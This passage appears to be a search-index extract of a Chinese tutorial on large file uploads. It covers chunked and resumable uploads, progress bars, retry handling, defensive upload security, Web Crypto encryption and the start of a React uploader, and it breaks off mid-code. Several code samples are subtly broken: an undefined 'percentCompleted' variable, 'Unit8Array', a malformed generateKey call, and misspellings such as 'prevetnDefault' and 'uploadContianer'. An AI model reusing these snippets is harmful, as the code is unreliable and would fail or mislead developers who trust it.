<li>\u4fdd\u6301\u754c\u9762\u54cd\u5e94\u6027\uff0c\u5373\u4f7f\u5728\u4e0a\u4f20\u5927\u6587\u4ef6\u65f6\uff0c\u53ef\u4ee5\u8003\u8651\u7528web worker\u5904\u7406\u6587\u4ef6\u4e0a\u4f20\u64cd\u4f5c\uff0c\u4ee5\u907f\u514d\u963b\u585e\u4e3b\u7ebf\u7a0b</li> <li>\u63d0\u4f9b\u6682\u505c\uff0c\u53d6\u6d88\u4e0a\u4f20\u7684\u9009\u9879\uff0c\u7ed9\u7528\u6237\u63a7\u5236\u4e0a\u4f20\u8fc7\u7a0b\u7684\u80fd\u529b</li> <li>\u5b89\u5168\u6027\u548c\u9690\u79c1</li> <li>\u786e\u4fdd\u4e0a\u4f20\u8fc7\u7a0b\u7b26\u5408\u5b89\u5168\u6807\u51c6\uff0c\u6bd4\u5982\u4f7f\u7528HTTPS\u52a0\u5bc6\u4e0a\u4f20</li> <li>\u5bf9\u4e8e\u660e\u6697\u6587\u4ef6\uff0c\u63d0\u4f9b\u989d\u5916\u7684\u5b89\u5168\u63aa\u65bd\uff0c\u5982\u52a0\u5bc6\u6587\u4ef6</li> <li>\u53cd\u9988\u548c\u652f\u6301</li> <li>\u63d0\u4f9b\u6709\u7528\u7684\u53cd\u9988\u673a\u5236\uff0c\u6bd4\u5982\u4e0a\u4f20\u6210\u529f\u6216\u5931\u8d25\u7684\u901a\u77e5</li> <li>\u5bf9\u4e8e\u4e0a\u4f20\u95ee\u9898\uff0c\u63d0\u4f9b\u7528\u6237\u652f\u6301\u9009\u9879\uff0c\u6bd4\u5982\u5e2e\u52a9\u6587\u6863\u6216\u5ba2\u670d\u8054\u7cfb\u65b9\u5f0f</li> </ol>"},{"location":"projects/file-upload/#28","title":"2.8 \u5982\u679c\u7528\u6237\u5728\u4e0a\u4f20\u8fc7\u7a0b\u4e2d\u6682\u505c\u548c\u65ad\u7f51\uff0c\u4f60\u5c06\u5982\u4f55\u5904\u7406\u5df2\u4e0a\u4f20\u7684\u6570\u636e\uff1f","text":"<ol> <li>\u542f\u7528\u5206\u7247\u4e0a\u4f20</li> <li>\u8ddf\u8e2a\u4e0a\u4f20\u8fdb\u5ea6</li> <li>\u5728\u524d\u7aef\uff0c\u8bb0\u5f55\u6bcf\u4e2a\u5206\u7247\u4e0a\u4f20\u72b6\u6001\uff0c\u4f8b\u5982\u7528\u4e00\u4e2a\u5e03\u5c14\u6570\u7ec4\u6216\u5bf9\u8c61\u6765\u6807\u8bb0\u6bcf\u4e2a\u5206\u7247\u662f\u5426\u6210\u529f\u4e0a\u4f20</li> <li>\u5f53\u7528\u6237\u6682\u505c\u4e0a\u4f20\u65f6\uff0c\u4fdd\u5b58\u8fd9\u4e9b\u8fdb\u5ea6\u4fe1\u606f</li> <li>\u5b9e\u73b0\u65ad\u70b9\u7eed\u4f20\u529f\u80fd</li> <li>\u5f53\u7528\u6237\u91cd\u65b0\u5f00\u59cb\u4e0a\u4f20\u65f6\uff0c\u4f7f\u7528\u4e4b\u524d\u4fdd\u5b58\u7684\u8fdb\u5ea6\u4fe1\u606f\u6765\u51b3\u5b9a\u4ece\u90a3\u4e2a\u5206\u7247\u5f00\u59cb\u4e0a\u4f20</li> <li> <p>\u53ea\u4e0a\u90a3\u4e9b\u5c1a\u672a\u4e0a\u4f20\u7684\u5206\u7247\uff0c\u907f\u514d\u91cd\u590d\u4e0a\u4f20\u5df2\u7ecf\u6210\u529f\u4e0a\u4f20\u7684\u5206\u7247</p> </li> <li> <p>\u5728\u670d\u52a1\u7aef\u5904\u7406\u5206\u7247</p> </li> <li>\u786e\u4fdd\u670d\u52a1\u5668\u63a5\u6536\u548c\u5b58\u50a8\u5206\u7247\uff0c\u5e76\u5728\u4e0a\u4f20\u5b8c\u6210\u540e\u7ec4\u5408\u8fd9\u4e9b\u5206\u7247</li> <li>\u670d\u52a1\u5668\u7aef\u53ef\u80fd\u9700\u8981\u5b9e\u73b0\u4e00\u79cd\u673a\u5236\u6765\u8bc6\u522b\u548c\u5173\u8054\u540c\u4e00\u6587\u4ef6\u7684\u4e0d\u540c\u5206\u7247</li> <li>\u63d0\u4f9b\u6062\u590d\u4e0a\u4f20\u7684\u9009\u9879</li> <li>\u63d0\u4f9b\u4e00\u7ee7\u7eed\u4e0a\u4f20\u9009\u9879</li> <li>\u6062\u590d\u4e0a\u4f20\u4e4b\u524d\uff0c\u53ef\u4ee5\u5148\u68c0\u67e5\u5df2\u4e0a\u4f20\u7684\u5206\u7247\u7684\u5b8c\u6574\u6027\u548c\u6709\u6548\u6027</li> <li>\u5904\u7406\u957f\u65f6\u95f4\u65ad\u5f00\u7684\u60c5\u51b5</li> <li>\u5982\u679c\u7528\u6237\u5728\u5f88\u957f\u65f6\u95f4\u540e\u624d\u8fd4\u56de\u6765\u7ee7\u7eed\u4e0a\u4f20\uff0c\u8003\u5f90\u5b9e\u73b0\u673a\u5236\u68c0\u6d4b\u4e0a\u4f20\u5206\u7247\u662f\u5426\u4ecd\u7136\u6709\u6548\uff0c\u670d\u52a1\u5668\u4e0a\u4e3a\u6bcf\u4e2a\u5206\u7247\u8bbe\u7f6e\u4e00\u4e2a\u201c\u8fc7\u671f\u65f6\u95f4\u201d</li> <li>\u5b89\u5168\u6027\u8003\u8651</li> <li>\u5904\u7406\u5206\u7247\u548c\u6062\u590d\u4e0a\u4f20\u65f6\uff0c\u786e\u4fdd\u9075\u5b88\u5b89\u5168\u6700\u4f73\u5b9e\u8df5\uff0c\u9632\u6b62\u6570\u636e\u6cc4\u9732\u6216\u672a\u6388\u6743\u8bbf\u95ee</li> </ol>"},{"location":"projects/file-upload/#29","title":"2.9 \u5982\u4f55\u5728\u524d\u7aef\u5b9e\u73b0\u4e0a\u4f20\u8fdb\u5ea6\u7684\u53ef\u89c6\u5316\u53cd\u9988\uff1f","text":"<p>\u8ffd\u8e2a\u4e0a\u4f20\u8fdb\u5ea6\u548c\u5728\u7528\u6237\u754c\u9762\u663e\u793a\u8fd9\u4e9b\u8fdb\u5ea6</p> <ol> <li>\u8bbe\u8ba1\u8fdb\u5ea6\u663e\u793a\u754c\u9762</li> </ol> <pre><code>&lt;div id=\"progressContainer\"&gt;\n    &lt;div id=\"progressBar\"&gt;&lt;/div&gt;\n &lt;/div&gt;\n</code></pre> <pre><code>#progressContainer {\n  width: 100%;\n  background-color:#ddd;\n}\n\n#progressBar {\n    width: 0%;\n  height: 30px;\n  background-color:#4caf50;\n  text-align:center;\n  line-height: 30px;\n  color: white;\n}\n</code></pre> <ol> <li>\u8ffd\u8e2a\u4e0a\u4f20\u8fdb\u5ea6\u5e76\u66f4\u65b0\u8fdb\u5ea6\u6761</li> </ol> <pre><code>var xhr = new XMLHttpRequest()\n\nxhr.upload.onprogress = function(event) {\n  if (event.lengthComputable) {\n    const  percentComplete = (event.loaded / event.total ) * 100\n    // \u66f4\u65b0\u8fdb\u5ea6\u6761\n    document.getElementById('progressBar').style.width = percentCompleted + '%'\n    document.getElementById('progressBar').textContent = Math.round(percentCompleted) + '%'\n  }\n}\n\nxhr.open('POST', '/upload', true)\n</code></pre> <ol> <li>\u5904\u7406\u4e0a\u4f20\u5b8c\u6210\u548c\u9519\u8bef</li> <li>\u5f53\u4e0a\u4f20\u5b8c\u6210\u65f6\uff0c\u786e\u4fdd\u8fdb\u5ea6\u6761\u4e3a100%</li> <li>\u5f53\u4e0a\u4f20\u8fc7\u7a0b\u51fa\u9519\uff0c\u63d0\u4f9b\u89c6\u89c9\u53cd\u9988\uff08\u5982\u66f4\u6539\u8fdb\u5ea6\u6761\u989c\u8272\u6216\u663e\u793a\u9519\u8bef\uff09</li> </ol>"},{"location":"projects/file-upload/#_1","title":"\u5728\u5927\u6587\u4ef6\u4e0a\u4f20\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u9047\u5230\u7f51\u7edc\u4e2d\u65ad\u6216\u670d\u52a1\u5668\u9519\u8bef\uff0c\u524d\u7aef\u5e94\u8be5\u5982\u4f55\u4f18\u96c5\u5904\u7406","text":"<ol> <li>\u6355\u83b7\u548c\u8bc6\u522b\u9519\u8bef</li> <li>\u6355\u83b7\u4e0a\u4f20\u8fc7\u7a0b\u4e2d\u7684\u9519\u8bef</li> <li>\u6839\u636e\u9519\u8bef\u7684\u7c7b\u578b\uff08\u5982\u7f51\u7edc\u4e2d\u65ad\uff0c \u670d\u52a1\u5668\u54cd\u5e94\u9519\u8bef\uff09\u5206\u7c7b\u5904\u7406</li> <li>\u53cb\u597d\u7684\u9519\u8bef\u6d88\u606f</li> <li>\u544a\u8bc9\u7528\u6237\u53d1\u751f\u4e86\u4ec0\u4e48\uff0c \u540c\u65f6\u907f\u514d\u8ba9\u7528\u6237\u611f\u5230\u56f0\u60d1\u548c\u6cae\u4e27</li> <li>\u81ea\u52a8\u91cd\u8bd5\u548c\u65ad\u70b9\u7eed\u4f20</li> <li>\u5bf9\u4e8e\u4e34\u65f6\u6027\u7684\u7f51\u7edc\u9519\u8bef\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u91cd\u8bd5\u4e0a\u4f20\uff0c\u8bbe\u7f6e\u91cd\u8bd5\u6b21\u6570\u548c\u91cd\u8bd5\u95f4\u9694\uff0c\u907f\u514d\u65e0\u9650\u91cd\u8bd5</li> <li>\u5bf9\u4e8e\u5df2\u7ecf\u4e0a\u4f20\u7684\u6587\u4ef6\u90e8\u5206\uff0c\u5b9e\u73b0\u65ad\u70b9\u7eed\u4f20\u529f\u80fd\uff0c\u8fd9\u6837\u5728\u7f51\u7edc\u8fde\u63a5\u6062\u590d\u540e\uff0c\u4ece\u4e2d\u65ad\u7684\u5730\u65b9\u5f00\u59cb\uff0c\u800c\u4e0d\u662f\u4ece\u5934\u518d\u6765</li> <li>\u63d0\u4f9b\u624b\u52a8\u91cd\u8bd5\u9009\u9879</li> <li>\u5728\u663e\u793a\u9519\u8bef\u4fe1\u606f\u7684\u540c\u65f6\uff0c\u63d0\u4f9b\u4e00\u4e2a\u201c\u91cd\u8bd5\u201d\u6309\u94ae\uff0c\u5141\u8bb8\u7528\u6237\u5728\u89e3\u51b3\u4e86\u95ee\u9898\uff08\u91cd\u65b0\u8fde\u63a5\u5230\u7f51\u7edc\u540e\uff09\u624b\u52a8\u542f\u52a8\u91cd\u8bd5</li> <li>\u65e5\u5fd7\u8bb0\u5f55</li> <li>\u8bb0\u5f55\u9519\u8bef\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5bf9\u4e8e\u8c03\u8bd5\u548c\u6539\u8fdb\u4e0a\u4f20\u8fc7\u7a0b\u5f88\u6709\u5e2e\u52a9</li> </ol>"},{"location":"projects/file-upload/#211","title":"2.11 \u63cf\u8ff0\u5728\u5927\u6587\u4ef6\u4e0a\u4f20\u4e2d\u5e38\u89c1\u7684\u5b89\u5168\u95ee\u9898\u53ca\u5176\u89e3\u51b3\u65b9\u6848","text":"<ol> <li>\u672a\u6388\u6743\u7684\u5927\u6587\u4ef6\u4e0a\u4f20</li> <li>\u95ee\u9898\u5982\u679c\u672a\u6b63\u786e\u9650\u5236\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\uff0c\u5982\u811a\u672c\u6216\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd9\u53ef\u80fd\u5bfc\u81f4\u670d\u52a1\u5668\u88ab\u653b\u51fb\u6216\u6570\u636e\u6cc4\u9732</li> <li>\u89e3\u51b3\u65b9\u6848\uff1a \u4e25\u683c\u9650\u5236\u53ef\u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u65b0\uff0c\u4f8b\u5982\u53ea\u5141\u8bb8\u7279\u5b9a\u7684\u6587\u4ef6\u6269\u5c55\u540d\u6216MIME\u7c7b\u578b\u3002\u5728\u670d\u52a1\u7aef\u4e5f\u9a8c\u8bc1\u6587\u4ef6\u7c7b\u578b\u9632\u6b62\u524d\u7aef\u9a8c\u8bc1\u88ab\u7ed5\u8fc7</li> <li>\u670d\u52a1\u62d2\u7edd\u653b\u51fb\uff08DOS)</li> <li>\u95ee\u9898\uff1a\u5982\u679c\u4e0a\u4f20\u5927\u91cf\u7684\u5927\u6587\u4ef6\uff0c\u653b\u51fb\u8005\u5c1d\u8bd5\u6d88\u8017\u670d\u52a1\u5668\u8d44\u6e90\uff0c\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528</li> <li>\u89e3\u51b3\u65b9\u6848\uff1a \u9650\u5236\u6587\u4ef6\u5927\u5c0f\uff0c\u5b9e\u73b0\u901f\u7387\u9650\u5236\u548c\u5e76\u53d1\u8fde\u63a5\u9650\u5236\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528CAPTCHA\u6765\u533a\u5206\u4eba\u7c7b\u7528\u6237\u548c\u673a\u5668\u4eba</li> <li>\u654f\u611f\u6570\u636e\u6cc4\u9732</li> <li>\u95ee\u9898\uff1a \u5982\u679c\u4e0a\u4f20\u5230\u7684\u6587\u4ef6\u5305\u542b\u654f\u611f\u4fe1\u606f\uff0c\u5982\u4e2a\u4eba\u6570\u636e\u6216\u673a\u5bc6\u6587\u4ef6\uff0c\u6570\u636e\u672a\u5f97\u5230\u9002\u5f53\u4fdd\u62a4\uff0c\u53ef\u80fd\u4f1a\u6cc4\u9732</li> <li>\u5b9e\u73b0\u77ed\u5200\u7aef\u7684\u52a0\u5bc6\uff0c\u786e\u4fdd\u6570\u636e\u5728\u4f20\u8f93\u6069\u597d\u5b58\u50a8\u8fc7\u7a0b\u4e2d\u5747\u88ab\u52a0\u5bc6\uff0c</li> <li>\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08XSS\uff09</li> <li>\u95ee\u9898\uff1a \u5982\u679c\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u5141\u8bb8\u4e0a\u4f20\u5305\u542b\u53ef\u6267\u884c\u4ee3\u7801\u7684\u6587\u4ef6\uff0c\u5e76\u4e14\u8fd9\u4e9b\u811a\u672c\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u5176\u4ed6\u7f51\u9875\u4e2d\u6267\u884c\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4XSS</li> <li>\u89e3\u51b3\u65b9\u6848\uff1a \u5bf9\u4e0a\u4f20\u7684\u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u9002\u5f53\u7684\u6e05\u7406\u548c\u9a8c\u8bc1\uff0c\u786e\u4fdd\u6587\u4ef6\u4e0d\u6267\u884c\u4efb\u4f55\u811a\u672c\u4ee3\u7801</li> <li>\u6587\u4ef6\u5b8c\u6574\u6027\u95ee\u9898</li> <li>\u95ee\u9898\uff1a \u5728\u4e0a\u4f20\u8fc7\u7a0b\u4e2d\uff0c\u6587\u4ef6\u53ef\u80fd\u4f1a\u56e0\u4e3a\u7f51\u7edc\u95ee\u9898\u6216\u6076\u610f\u653b\u51fb\u800c\u635f\u574f\u6216\u7be1\u6539</li> <li>\u89e3\u51b3\u65b9\u6848\uff1a \u4f7f\u7528\u6821\u9a8c\u548c\uff08\u5982MD5\u6216SHA-256)\u6765\u9a8c\u8bc1\u6587\u4ef6\u5b8c\u6574\u6027\u3002</li> <li>\u8eab\u4efd\u9a8c\u8bc1\u548c\u6388\u6743</li> <li>\u95ee\u9898\uff1a \u672a\u6388\u6743\u7684\u7528\u6237\u53ef\u80fd\u5c1d\u8bd5\u4e0a\u4f20\u6587\u4ef6</li> <li>\u89e3\u51b3\u65b9\u6848\uff1a \u5b9e\u65bd\u5f3a\u5236\u8eab\u4efd\u9a8c\u8bc1\u548c\u6388\u6743\u68c0\u67e5\uff0c\u786e\u4fdd\u53ea\u6709\u5177\u6709\u9002\u5f53\u6743\u9650\u7684\u7528\u6237\u624d\u80fd\u4e0a\u4f20\u6587\u4ef6</li> <li>\u670d\u52a1\u7aef\u6267\u884c\u4ee3\u7801</li> <li>\u95ee\u9898\uff1a\u4e0a\u4f20\u7684\u6587\u4ef6\u53ef\u80fd\u88ab\u8bef\u8ba4\u4e3a\u662f\u670d\u52a1\u5668\u4e0a\u53ef\u6267\u884c\u4ee3\u7801\uff0c</li> <li>\u89e3\u51b3\u65b9\u6848\uff1a\u5728\u670d\u52a1\u5668\u7aef\u8bbe\u7f6e\u9002\u5f53\u7684\u6267\u884c\u6743\u9650\uff0c\u786e\u4fdd\u4e0a\u4f20\u7684\u6587\u4ef6\u4e0d\u4f1a\u88ab\u6267\u884c\uff0c\u5c06\u4e0a\u4f20\u7684\u6587\u4ef6\u5b58\u50a8\u9694\u79bb\u5728\u4e0d\u53ef\u6267\u884c\u76ee\u5f55\u4e0a</li> </ol>"},{"location":"projects/file-upload/#212","title":"2.12 \u5982\u4f55\u5728\u524d\u7aef\u5b9e\u73b0\u5927\u6587\u4ef6\u4e0a\u4f20\u7684\u52a0\u5bc6\u5904\u7406\uff1f","text":"<ol> <li>\u9009\u62e9\u52a0\u5bc6\u7b97\u6cd5</li> <li>\u9009\u62e9\u4e00\u4e2a\u9002\u5408\u7684\u52a0\u5bc6\u7b97\u6cd5</li> <li>\u751f\u6210\u5bc6\u94a5</li> <li>\u4f7f\u7528<code>Web Crypto API</code> \u751f\u6210\u5bc6\u94a5\uff0c\u8fd9\u662f\u4e00\u4e2a\u5185\u7f6e\u4e8e\u73b0\u4ee3\u6d4f\u89c8\u5668\u4e2d\u7684\u52a0\u5bc6API</li> <li>\u5bc6\u94a5\u7ba1\u7406\u975e\u5e38\u91cd\u8981\uff0c\u5982\u679c\u5bc6\u94a5\u4e22\u5931\uff0c\u52a0\u5bc6\u540e\u7684\u6587\u4ef6\u5c06\u65e0\u6cd5\u89e3\u5bc6</li> <li>\u6587\u4ef6\u5206\u7247\u52a0\u5bc6</li> <li>\u53d7\u9650\u4e8e\u6d4f\u89c8\u5668\u5185\u5b58\u9650\u5236\uff0c\u907f\u514d\u4e00\u6b21\u6574\u4e2a\u5927\u6587\u4ef6\u52a0\u5bc6\uff0c\u5206\u5272\u6210\u5c0f\u5757\u52a0\u5bc6</li> <li>\u5904\u7406\u52a0\u5bc6\u6570\u636e</li> <li>\u52a0\u5bc6\u6bcf\u4e2a\u5206\u7247\u540e\uff0c\u5c06\u5176\u6dfb\u52a0\u5230FormData\u5bf9\u8c61\u4e2d</li> </ol> <pre><code>async function encryptData(data, key) {\n\n    let encrypted  = await window.crypto.subtle.encrypt(\n    {\n            name: \"AES-GCM\",\n      iv: window.crypto.getRandomValues(new Unit8Array(12))\n\n    },\n    key,\n    data\n  )\n  return encrypted\n}\n\nasync function encryptFileChunk(chunk) {\n    let key = await window.crypto.subtle.generateKey(\n        {\n                name: 'AES-GCM',\n        length: 256\n      }\n    ),\n    true,\n    [\"encrypt\", \"decrypt\"]\n\n    return await encryptData(chunk, key)\n}\n</code></pre>"},{"location":"projects/file-upload/#_2","title":"\u5927\u6587\u4ef6\u4e0a\u4f20\u4e2d\u7684\u524d\u540e\u7aef\u534f\u4f5c\u901a\u5e38\u662f\u600e\u6837\u7684\uff1f \u8bf7\u63cf\u8ff0\u6574\u4e2a\u6d41\u7a0b","text":"<ol> <li>\u7528\u6237\u9009\u62e9\u6587\u4ef6</li> <li>\u62d6\u653e\u6216\u70b9\u51fb\u9009\u62e9\u8981\u4e0a\u4f20\u7684\u6587\u4ef6</li> <li>\u524d\u7aef\u51c6\u5907\u6587\u4ef6\u4e0a\u4f20</li> <li>\u6587\u4ef6\u5206\u7247\uff1a</li> <li>\u6587\u4ef6\u9a8c\u8bc1\uff1a\u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7c7b\u578b\uff0c\u907f\u514d\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\uff0c\u5982\u811a\u672c\u6216\u53ef\u6267\u884c\u6587\u4ef6\uff0c</li> <li>\u521d\u59cb\u5316\u4e0a\u4f20</li> <li>\u5411\u540e\u7aef\u53d1\u9001\u521d\u59cb\u5316\u4e0a\u4f20\u7684\u8bf7\u6c42\uff0c\u8bf7\u6c42\u53ef\u80fd\u5305\u542b\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u6587\u4ef6\u540d\uff0c\u9884\u671f\u5206\u7247\u6570</li> <li>\u540e\u7aef\u63a5\u53d7\u521d\u59cb\u5316\u8bf7\u6c42\uff0c\u7136\u540e\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u5230\u7ed8\u753b\uff0c\u8fd4\u56de\u552f\u4e00\u4f1a\u8bdd\u6807\u8bc6\u7b26\u6216\u4e0a\u4f20URL</li> <li>\u5206\u7247\u4e0a\u4f20</li> <li>\u4e0a\u4f20\u5206\u7247\uff1a \u524d\u7aef\u4e0a\u4f20\u7684\u6bcf\u4e2a\u5206\u7247\u90fd\u4f1a\u9644\u5e26\u6807\u8bb0\u6216\u5e8f\u53f7\uff0c\u4ee5\u4fbf\u540e\u7aef\u53ef\u4ee5\u6b63\u786e\u91cd\u7ec4\u6587\u4ef6</li> <li>\u8fdb\u5ea6\u53cd\u9988\uff1a \u663e\u793a\u4e0a\u4f20\u8fdb\u5ea6\uff0c\u5e76\u5141\u8bb8\u7528\u6237\u6682\u505c\uff0c\u53d6\u6d88\u6216\u91cd\u8bd5\u4e0a\u4f20</li> <li>\u540e\u7aef\u5904\u7406</li> <li>\u63a5\u6536\u5206\u7247\uff1a\u540e\u7aef\u63a5\u6536\u6bcf\u4e2a\u4e0a\u4f20\u5206\u7247\uff0c\u4fdd\u5b58\u5230<code>tmp</code>\u4e34\u65f6\u6587\u4ef6\u5939\u4e2d</li> <li>\u5206\u7247\u91cd\u7ec4\uff1a\u6240\u6709\u5206\u7247\u4e0a\u4f20\u5b8c\u6210\u540e\uff0c\u540e\u7aef\u5c06\u8fd9\u4e9b\u91cd\u7ec4\u4e3a\u539f\u59cb\u6587\u4ef6</li> <li>\u4e0a\u4f20\u5b8c\u6210</li> <li>\u4e0a\u4f20\u5b8c\u6210\u540e\uff0c\u540e\u7aef\u53d1\u9001\u4e00\u4e2a\u786e\u8ba4\u54cd\u5e94\u7ed9\u524d\u7aef\uff0c</li> <li>\u524d\u7aef\u6536\u5230\u786e\u8ba4\u54cd\u5e94\uff0c\u663e\u793a\u4e0a\u4f20\u6210\u529f\u7684\u6d88\u606f</li> <li>\u5b89\u5168\u548c\u9a8c\u8bc1</li> <li>\u6e05\u7406\u548c\u7ef4\u62a4</li> <li>\u540e\u7aef\u53ef\u80fd\u9700\u8981\u5b9a\u671f\u6e05\u7406\u672a\u5b8c\u6210\u7684\u4e0a\u4f20\u4f1a\u8bdd\uff0c\u4ee5\u91ca\u653e\u670d\u52a1\u5668\u8d44\u6e90</li> <li>\u524d\u7aef\u5728\u4e0a\u4f20\u8fc7\u7a0b\u4e2d\u4e5f\u5e94\u7ba1\u7406\u8d44\u6e90\u4f7f\u7528\uff0c\u5982\u9002\u65f6\u91ca\u653e\u4e0d\u518d\u9700\u8981\u7684\u5185\u5b58</li> </ol>"},{"location":"projects/file-upload/#214-api","title":"2.14 \u5982\u679c\u540e\u7aefAPI\u5728\u4e0a\u4f20\u8fc7\u7a0b\u4e2d\u53d1\u751f\u66f4\u6539\uff0c\u524d\u7aef\u5e94\u8be5\u5982\u4f55\u5e94\u5bf9","text":"<ol> <li>\u7248\u672c\u63a7\u5236</li> <li>\u4fdd\u8bc1\u540e\u7aefAPI\u5177\u6709\u7248\u672c\u63a7\u5236\uff0c\u8fd9\u6837\u5373\u4f7fAPI\u6709\u66f4\u65b0\uff0c\u4e5f\u53ef\u4ee5\u4fdd\u6301\u65e7\u7248\u672cAPI\u4e00\u6bb5\u65f6\u95f4\uff0c\u76f4\u5230\u524d\u7aef\u4e5f\u66f4\u65b0</li> <li>\u524d\u7aef\u53ef\u4ee5\u6307\u5b9a\u4f7f\u7528\u7279\u5b9a\u7248\u672cAPI\uff0c\u786e\u4fdd\u5728\u8fc7\u6e21\u671f\u95f4\u4ecd\u80fd\u6b63\u5e38\u5de5\u4f5c</li> <li>\u53ca\u65f6\u6c9f\u901a</li> <li>\u540e\u7aef\u56e2\u961f\u5e94\u8be5\u63d0\u524d\u901a\u77e5\u524d\u7aef\u56e2\u961f\u5173\u4e8e\u5373\u5c06\u6cd5\u7684API\u66f4\u6539\uff0c\u5305\u62ec\u65b0\u7684API\u6587\u6863\uff0c\u66f4\u6539\u5185\u5bb9\uff0c\u4e0a\u7ebf\u65f6\u95f4</li> <li>\u7075\u6d3b\u914d\u7f6e</li> <li> <p>\u524d\u7aef\u4ee3\u7801\u5e94\u8be5\u8bbe\u8ba1\u6210\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u6216\u73af\u5883\u53d8\u91cf\u8f7b\u677e\u5207\u6362API \u7aef\u70b9\u6216\u8c03\u6574\u8bf7\u6c42\u53c2\u6570</p> </li> <li> <p>\u9519\u8bef\u5904\u7406\u548c\u56de\u9000\u673a\u5236</p> </li> <li> <p>\u5f3a\u5316\u524d\u7aef\u7684\u9519\u8bef\u5904\u7406\u903b\u8f91\uff0c\u4ee5\u5e94\u5bf9\u540e\u7aefAPI\u66f4\u6539\u53ef\u80fd\u5e26\u6765\u7684\u95ee\u9898\u3002</p> </li> <li>\u5b9e\u73b0\u56de\u9000\u673a\u5236\uff0c\u5f53\u65b0API\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u53ef\u4ee5\u4e34\u65f6\u56de\u9000\u5230\u65e7API\u3002</li> </ol>"},{"location":"projects/file-upload/#3","title":"3. \u5927\u6587\u4ef6\u4e0a\u4f20\u7684\u4e1a\u52a1\u80cc\u666f\u548c\u6311\u6218","text":"<p>3.1 \u4e1a\u52a1\u80cc\u666f</p> <pre><code>1. \u5a92\u4f53\u5904\u7406\uff1a \u89c6\u9891\u7f16\u8f91\u5e73\u53f0\uff0c\u97f3\u9891\u5904\u7406\u8f6f\u4ef6\u3001\u56fe\u50cf\u5e93\u7b49\u9700\u8981\u4e0a\u4f20\u5927\u91cf\u5a92\u4f53\u6587\u4ef6\n1. \u6570\u636e\u5907\u4efd\u4e0e\u8fc1\u79fb\uff1a \u4f01\u4e1a\u9700\u8981\u5907\u4efd\u6216\u8fc1\u79fb\u5927\u91cf\u6570\u636e\uff0c\u5305\u62ec\u6570\u636e\u5e93\u6587\u4ef6\u3001\u7cfb\u7edf\u955c\u50cf\u7b49\n1. \u5185\u5bb9\u5206\u53d1\u7f51\u7edc\uff1a \u5728CDN\u4e2d\u4e0a\u4f20\u5927\u6587\u4ef6\u4ee5\u4fbf\u66f4\u5feb\u5728\u5168\u7403\u8303\u56f4\u5185\u5206\u53d1\n1. \u79d1\u5b66\u4e0e\u7814\u7a76\uff1a \u4e0a\u4f20\u5927\u578b\u6570\u636e\u96c6\uff0c \u4f8b\u5982\u57fa\u56e0\u7ec4\u5e8f\u5217\u3001\u6c14\u8c61\u6a21\u578b\u6570\u636e\n1. \u6559\u80b2\u548c\u5728\u7ebf\u5b66\u4e60\uff1a \u4e0a\u4f20\u9ad8\u8d28\u91cf\u7684\u6559\u5b66\u89c6\u9891\u548c\u6559\u6750\n1. \u6cd5\u5f8b\u548c\u8d22\u52a1\uff1a \u5171\u4eab\u5927\u91cf\u7684\u6cd5\u5f8b\u6587\u6863\u6216\u8d22\u52a1\u62a5\u8868\n</code></pre>"},{"location":"projects/file-upload/#4-react","title":"4. \u5927\u6587\u4ef6\u4e0a\u4f20\u5b9e\u73b0(React)","text":""},{"location":"projects/file-upload/#41","title":"4.1 \u521b\u5efa\u9879\u76ee","text":"<pre><code>mkdir uploadfile &amp;&amp; cd $_\nnpx create-react-app client\nnpm install @ant-design/icons antd axios\nnpm start\n</code></pre>"},{"location":"projects/file-upload/#42","title":"4.2 \u7ed8\u5236\u9875\u9762","text":"<p><code>src\\index.js</code></p> <pre><code>import React from 'react'\nimport ReactDOM from 'react-dom/client'\nimport FileUploader from './FileUploader'\nconst root = ReactDOM.createRoot(document.getElementById('root'))\nroot.render(\n    &lt;FileUploader/&gt;\n)\n</code></pre> <p><code>src\\FileUploader.js</code></p> <pre><code>import { InboxOutlined } from '@ant-design/icons'\nimport './FileUploader.css'\n\nconst FileUploader = () =&gt; {\n  return (\n    &lt;div className=\"upload-container\"&gt;\n        &lt;InboxOutlined /&gt;\n    &lt;/div&gt;\n  )\n}\nexport default FileUploader\n</code></pre> <p><code>src/FileUploader.css</code></p> <pre><code>.upload-container {\n  width: 100%;\n  height: 200px;\n  display: flex;\n  align-items: center;\n  border: 1px dashed #d9d9d9;\n  background: #fafafa;\n}\n\n.upload-contianer:hover {\n    border-color: #40a9ff;\n}\n.upload-container span {\n  font-size: 60px;\n}\n</code></pre>"},{"location":"projects/file-upload/#43","title":"4.3 \u62d6\u5165\u6587\u4ef6","text":"<p><code>src/FileUploader.js</code></p> <pre><code>+ import {useRef} from 'react'\nimport { InboxOutlined } from '@ant-design/icons'\nimport './FileUploader.css'\n+ import useDrag from \"./useDrag\"\nconst FileUploader = () =&gt; {\n+ const uploadContainerRef = useRef(null)\n+ useDrag(uploadContainerRef)\n  return (\n+   &lt;div className=\"upload-container\" ref={uploadContainerRef}&gt;\n        &lt;InboxOutlined /&gt;\n    &lt;/div&gt;\n  )\n}\nexport default FileUploader\n</code></pre> <p><code>src\\useDrag.js</code></p> <pre><code>import { useState, useEffect } from 'react'\n\n  const handleDrag = (e) =&gt; {\n    e.prevetnDefault()\n    e.stopPropagation()\n    const { files } = e.dataTransfer;\n    console.log(\"files\", files)\n  }\n\n\nfunction useDrag(uploadContainerRef) {\n  const [selectedFile, setSelectedFile] = useState(null)\n    useEffect(() =&gt; {\n   const uploadContianer = uploadContainerRef.current\n   uploadContainer.addEventListener('dragenter', 